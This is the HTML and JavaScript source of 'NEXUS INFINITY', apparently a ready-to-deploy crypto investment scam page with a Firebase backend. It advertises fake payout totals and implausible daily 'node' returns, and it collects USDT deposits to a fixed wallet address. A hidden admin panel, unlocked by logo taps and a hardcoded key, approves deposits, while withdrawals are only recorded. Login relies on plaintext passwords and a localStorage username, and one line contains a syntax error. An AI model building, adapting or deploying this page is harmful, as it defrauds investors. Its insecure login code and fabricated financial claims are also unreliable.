<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Institutional Grade Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        :root { --neon-red: #ff003c; --neon-pink: #ff00ff; --black: #050505; --glass: rgba(15, 15, 15, 0.95); }
        body { background: var(--black); color: white; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }
        .ticker-wrap { background: rgba(255, 0, 60, 0.1); border-bottom: 1px solid rgba(255, 0, 60, 0.2); overflow: hidden; padding: 12px 0; }
        .ticker { display: inline-block; animation: ticker 40s linear infinite; font-size: 10px; font-weight: 800; text-transform: uppercase; white-space: nowrap; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .glass-panel { background: var(--glass); backdrop-filter: blur(40px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 35px; }
        .btn-master { background: linear-gradient(90deg, var(--neon-red), var(--neon-pink)); color: white; font-weight: 800; padding: 18px; border-radius: 22px; width: 100%; transition: 0.3s; box-shadow: 0 10px 30px rgba(255, 0, 60, 0.3); border: none; }
        .input-dark { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08); border-radius: 20px; padding: 18px; color: white; width: 100%; outline: none; }
        .nav-item { color: #555; text-align: center; cursor: pointer; transition: 0.3s; font-size: 10px; font-weight: 800; }
        .nav-item.active { color: var(--neon-red); text-shadow: 0 0 15px var(--neon-red); }
        .hidden { display: none !important; }
        .proof-img { max-width: 150px; border-radius: 10px; border: 1px solid var(--neon-red); margin-top: 10px; }
    </style>
</head>
<body>

    <div class="ticker-wrap"><div class="ticker">BTC/USDT $64,120.50 ▲ +1.5% &nbsp;&nbsp;&nbsp; ETH/USDT $3,210.12 ▼ -0.2% &nbsp;&nbsp;&nbsp; GLOBAL PAYOUTS: $128,401,200 &nbsp;&nbsp;&nbsp; SECURE NODES ACTIVE: 15/15</div></div>

    <div id="splash" class="fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center">
        <div class="w-24 h-24 bg-gradient-to-tr from-[#ff003c] to-[#ff00ff] rounded-[2.5rem] flex items-center justify-center text-5xl font-black shadow-[0_0_60px_rgba(255,0,60,0.4)]">N</div>
        <h1 style="font-family: 'Syncopate'" class="mt-8 tracking-[0.4em] text-xs">NEXUS<span class="text-[#ff003c]">INFINITY</span></h1>
    </div>

    <div id="auth-section" class="min-h-screen p-8 flex flex-col justify-center hidden">
        <div class="max-w-sm mx-auto w-full space-y-10 text-center">
            <div id="logo-tap" class="w-20 h-20 bg-zinc-900 mx-auto rounded-3xl flex items-center justify-center text-4xl font-black border border-white/5 shadow-2xl">N</div>
            <div id="login-ui" class="space-y-4">
                <input type="text" id="l-user" placeholder="Terminal Account ID" class="input-dark">
                <input type="password" id="l-pass" placeholder="Security Key" class="input-dark">
                <button onclick="handleLogin()" class="btn-master">Authorize Connection</button>
            </div>
        </div>
    </div>

    <div id="dashboard-section" class="hidden pb-32">
        <nav class="p-6 sticky top-0 bg-black/80 backdrop-blur-2xl z-[500] border-b border-white/5 flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-10 h-10 bg-zinc-900 rounded-xl flex items-center justify-center font-black border border-white/10">N</div>
                <span id="nav-user" class="text-sm font-black italic text-[#ff003c]">...</span>
            </div>
            <button onclick="logout()"><i class="fa-solid fa-power-off text-zinc-600"></i></button>
        </nav>

        <div id="page-home" class="p-6 space-y-6">
            <div class="glass-panel p-8 bg-gradient-to-br from-zinc-900 to-black relative overflow-hidden">
                <p class="text-[10px] font-black text-zinc-500 uppercase tracking-widest mb-2">Institutional Net Equity</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter">$0.00</h2>
                <div class="mt-8 flex justify-between items-center border-t border-white/5 pt-6">
                    <div><p class="text-[7px] text-zinc-500 mb-1 uppercase">Yield Accrued</p><p id="profit-txt" class="text-lg font-black text-[#ff00ff]">+$0.00</p></div>
                    <div class="text-right"><p class="text-[7px] text-zinc-500 mb-1 uppercase">Network Sync</p><p class="text-[9px] font-black text-green-500 animate-pulse">● STABLE</p></div>
                </div>
            </div>
            <h3 class="text-[10px] font-black text-zinc-600 uppercase tracking-widest">Active Node Synchronizations</h3>
            <div id="active-nodes-list" class="space-y-4"></div>
        </div>

        <div id="page-nodes" class="p-6 space-y-6 hidden">
            <div id="nodes-market" class="grid gap-4"></div>
        </div>

        <div id="page-finance" class="p-6 space-y-8 hidden">
            <div class="glass-panel p-7 space-y-6">
                <h3 class="text-lg font-black italic uppercase text-[#ff003c]">Capital Injection</h3>
                <div class="bg-black/60 p-4 rounded-2xl border border-white/5">
                    <p class="text-[7px] text-zinc-500 font-black mb-1">USDT (TRC20) ADDRESS</p>
                    <p class="text-[11px] font-black text-[#ff00ff] break-all">TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76</p>
                </div>
                <input type="number" id="dep-amt" placeholder="Amount ($)" class="input-dark">
                <input type="text" id="dep-tid" placeholder="Transaction Hash (TID)" class="input-dark">
                <div>
                    <p class="text-[9px] text-zinc-500 mb-2 uppercase">Upload Transfer Proof (Screenshot):</p>
                    <input type="file" id="dep-proof" accept="image/*" class="text-[9px] text-zinc-500 block w-full file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-[9px] file:font-black file:bg-zinc-800 file:text-white">
                </div>
                <button onclick="submitDep()" class="btn-master">Authorize Injection</button>
            </div>

            <div class="glass-panel p-7 space-y-6">
                <h3 class="text-lg font-black italic uppercase">Capital Payout</h3>
                <select id="w-method" class="input-dark bg-black">
                    <option value="Binance Pay">Binance Pay</option>
                    <option value="Trust Wallet">Trust Wallet (TRC20)</option>
                    <option value="OKX">OKX Exchange</option>
                    <option value="Kraken">Kraken Terminal</option>
                    <option value="Coinbase">Coinbase Wallet</option>
                    <option value="Bybit">Bybit Network</option>
                    <option value="KuCoin">KuCoin Node</option>
                </select>
                <input type="number" id="w-amt" placeholder="Withdrawal Amount ($)" class="input-dark">
                <input type="text" id="w-addr" placeholder="Destination Address / ID" class="input-dark">
                <button onclick="submitWith()" class="btn-master !bg-zinc-800">Request Payout</button>
            </div>
        </div>

        <div id="page-history" class="p-6 space-y-6 hidden">
            <h3 class="text-xl font-black italic uppercase">Terminal Transaction Logs</h3>
            <div id="history-list" class="space-y-4"></div>
        </div>

        <div id="page-trust" class="p-6 space-y-6 hidden">
            <div class="glass-panel p-6 space-y-4">
                <h3 class="text-xs font-black text-[#ff003c] uppercase tracking-widest">Global Institutional FAQ</h3>
                <div class="space-y-2">
                    <details class="bg-black/40 p-4 rounded-2xl border border-white/5"><summary class="text-[10px] font-black">How do Nodes work?</summary><p class="text-[9px] text-zinc-500 mt-2">Nodes leverage institutional liquidity to generate 24/7 arbitrage yields across global markets.</p></details>
                    <details class="bg-black/40 p-4 rounded-2xl border border-white/5"><summary class="text-[10px] font-black">Withdrawal Speed?</summary><p class="text-[9px] text-zinc-500 mt-2">All payout requests are processed within 2 to 24 hours via high-priority blockchain tunnels.</p></details>
                </div>
            </div>
            <div class="space-y-2">
                <div onclick="alert('PRIVACY PROTOCOL:\n- End-to-end encryption\n- Zero personal data logging\n- Anonymized blockchain routing.')" class="glass-panel p-6 flex justify-between items-center text-[10px] font-black"><span>PRIVACY POLICY</span> <i class="fa-solid fa-chevron-right opacity-20"></i></div>
                <div onclick="alert('TERMS OF SERVICE:\n- Min Dep: $10\n- Min With: $5\n- 3-Level Referral enabled.')" class="glass-panel p-6 flex justify-between items-center text-[10px] font-black"><span>TERMS & CONDITIONS</span> <i class="fa-solid fa-chevron-right opacity-20"></i></div>
            </div>
        </div>

        <div class="fixed bottom-0 left-0 right-0 bg-black/80 backdrop-blur-3xl border-t border-white/5 p-6 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item active"><i class="fa-solid fa-shield-halved text-xl mb-1"></i><p>CORE</p></div>
            <div onclick="switchPage('nodes')" class="nav-item"><i class="fa-solid fa-microchip text-xl mb-1"></i><p>NODES</p></div>
            <div onclick="switchPage('finance')" class="nav-item"><i class="fa-solid fa-vault text-xl mb-1"></i><p>VAULT</p></div>
            <div onclick="switchPage('history')" class="nav-item"><i class="fa-solid fa-list-ul text-xl mb-1"></i><p>LOGS</p></div>
            <div onclick="switchPage('trust')" class="nav-item"><i class="fa-solid fa-globe text-xl mb-1"></i><p>TRUST</p></div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#050505] z-[9999] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h2 class="text-xl font-black italic text-[#ff003c]">MASTER TERMINAL OVERRIDE</h2><button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl">&times;</button></div>
        <div id="admin-dep-list" class="space-y-6"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
          apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0",
          authDomain: "live-54fb4.firebaseapp.com",
          databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com",
          projectId: "live-54fb4",
          storageBucket: "live-54fb4.firebasestorage.app",
          messagingSenderId: "781910562842",
          appId: "1:781910562842:web:07a887f860d30fd17d99a3"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const nodesData = [
            ...Array.from({length: 10}, (_, i) => ({ id: i+1, type: 'Standard', title: `Standard Node ${i+1}`, price: (i+1)*25, daily: ((i+1)*2.2).toFixed(2), days: 30 })),
            ...Array.from({length: 5}, (_, i) => ({ id: i+11, type: 'Apex', title: `Apex Elite-0${i+1}`, price: (i+1)*450, daily: ((i+1)*48).toFixed(2), days: 45 }))
        ];

        window.onload = () => {
            renderNodes();
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                const u = localStorage.getItem('nexus_user');
                if(u) showDashboard(u);
                else document.getElementById('auth-section').classList.remove('hidden');
            }, 2500);
        };

        function renderNodes() {
            document.getElementById('nodes-market').innerHTML = nodesData.map(n => `
                <div class="glass-panel p-6 flex justify-between items-center ${n.type === 'Apex' ? 'border-[#ff003c] shadow-[0_0_20px_rgba(255,0,60,0.1)]' : ''}">
                    <div>
                        <p class="text-[7px] font-black ${n.type === 'Apex' ? 'text-[#ff003c]' : 'text-zinc-500'} uppercase mb-1">${n.type} Node</p>
                        <h4 class="text-xl font-black italic tracking-tighter">${n.title}</h4>
                        <p class="text-[9px] font-black text-green-500">+$${n.daily}/Day ROI</p>
                    </div>
                    <div class="text-right">
                        <p class="text-lg font-black">$${n.price}</p>
                        <button onclick="buyNode(${n.id})" class="bg-white text-black px-6 py-2 rounded-xl text-[9px] font-black mt-1">DEPLOY</button>
                    </div>
                </div>
            `).join('');
        }

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard-section').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;

            onValue(ref(db, `users/${uid}`), (snap) => {
                const data = snap.val(); if(!data) return;
                document.getElementById('balance-txt').innerText = '$' + (data.balance || 0).toLocaleString();
                document.getElementById('profit-txt').innerText = '+$' + (data.profit || 0).toLocaleString();
                
                if(data.history) {
                    const logs = Object.entries(data.history).reverse();
                    document.getElementById('history-list').innerHTML = logs.map(([key, log]) => `
                        <div class="glass-panel p-5 flex justify-between items-center border-l-4 ${log.status === 'pending' ? 'border-yellow-500' : 'border-green-500'}">
                            <div><p class="text-[10px] font-black uppercase">${log.type}</p><p class="text-[7px] text-zinc-500">${log.date}</p></div>
                            <div class="text-right"><p class="text-sm font-black">$${log.amount}</p><span class="text-[8px] font-black uppercase ${log.status==='pending'?'text-yellow-500':'text-green-500'}">${log.status}</span></div>
                        </div>
                    `).join('');
                }

                if(data.activeNodes) {
                    document.getElementById('active-nodes-list').innerHTML = Object.values(data.activeNodes).map(n => `
                        <div class="glass-panel p-6 border-l-4 border-[#ff003c]">
                            <div class="flex justify-between items-center mb-2"><p class="text-[9px] font-black uppercase">${n.title}</p><span class="text-[7px] text-green-500 font-black animate-pulse">● SYNCHRONIZED</span></div>
                            <div class="w-full bg-zinc-900 h-1 rounded-full overflow-hidden"><div class="bg-[#ff003c] h-full" style="width: 75%"></div></div>
                        </div>`).join('');
                }
            });
        }

        // Base64 Proof Upload System
        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('dep-amt').value;
            const tid = document.getElementById('dep-tid').value;
            const file = document.getElementById('dep-proof').files[0];
            if(!amt || !tid || !file) return alert("All protocol data and TID/Proof required!");

            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = async () => {
                const base64Img = reader.result;
                const hRef = push(ref(db, `users/${user}/history`));
                const entry = { user, amount: amt, tid, proof: base64Img, status: 'pending', date: new Date().toLocaleString(), type: 'Deposit', historyKey: hRef.key };
                await set(hRef, entry);
                await set(ref(db, `admin/deposits/${hRef.key}`), entry);
                alert("Deposit Protocol Initiated!");
            };
        };

        window.submitWith = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('w-amt').value;
            const method = document.getElementById('w-method').value;
            const addr = document.getElementById('w-addr').value;
            const snap = await get(ref(db, `users/${user}`));
            if((snap.val().balance || 0) < amt) return alert("Insufficient Capital!");
            
            const hRef = push(ref(db, `users/${user}/history`));
            const entry = { user, amount: amt, method, address: addr, status: 'pending', date: new Date().toLocaleString(), type: 'Withdrawal' };
            await set(hRef, entry);
            alert("Withdrawal Payout Requested!");
        };

        window.buyNode = async (id) => {
            const user = localStorage.getItem('nexus_user');
            const node = nodesData.find(n => n.id === id);
            const snap = await get(ref(db, `users/${user}`));
            if((snap.val().balance || 0) < node.price) return alert("Insufficient Balance!");
            await update(ref(db, `users/${user}`), { balance: (snap.val().balance - node.price) });
            await push(ref(db, `users/${user}/activeNodes`), { ...node });
            alert("Node Deployed!");
            switchPage('home');
        };

        // Admin Override
        let tc = 0; document.getElementById('admin-trigger').onclick = document.getElementById('logo-tap').onclick = () => {
            tc++; if(tc === 4) { if(prompt("Auth Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } tc = 0; }
        };

        function loadAdmin() {
            onValue(ref(db, 'admin/deposits'), (snap) => {
                const d = snap.val();
                document.getElementById('admin-dep-list').innerHTML = d ? Object.entries(d).map(([id, l]) => `
                    <div class="glass-panel p-6 space-y-4">
                        <p class="text-xs font-black">User: <span class="text-[#ff003c]">${l.user}</span> | Amount: <span class="text-green-500">$${l.amount}</span></p>
                        <p class="text-[10px] text-zinc-500 font-bold">TID: ${l.tid}</p>
                        <img src="${l.proof}" class="proof-img" onclick="window.open(this.src)">
                        <button onclick="approveDep('${id}','${l.user}',${l.amount},'${l.historyKey}')" class="w-full bg-green-600 py-3 rounded-2xl text-[10px] font-black uppercase">Approve Protocol</button>
                    </div>
                `).join('') : '<p class="text-center text-xs opacity-30">No Transactions Pending</p>';
            });
        }

        window.approveDep = async (aKey, u, a, hKey) => {
            const snap = await get(ref(db, `users/${u}`));
            await update(ref(db, `users/${u}`), { balance: (snap.val().balance || 0) + parseFloat(a) });
            await update(ref(db, `users/${u}/history/${hKey}`), { status: 'Approved' });
            await remove(ref(db, `admin/deposits/${aKey}`));
            alert("Capital Authorized!");
        };

        window.handleLogin = async () => {
            const u = document.getElementById('l-user').value.trim();
            const p = document.getElementById('l-pass').value.trim();
            const snap = await get(ref(db, ``users/${u}`));
            if(snap.exists() && snap.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); }
            else alert("Authorization Failed!");
        };

        window.switchPage = (p) => {
            ['home', 'nodes', 'finance', 'history', 'trust'].forEach(pg => document.getElementById('page-'+pg).classList.add('hidden'));
            document.getElementById('page-'+p).classList.remove('hidden');
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            if(event) event.currentTarget.classList.add('active');
        };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
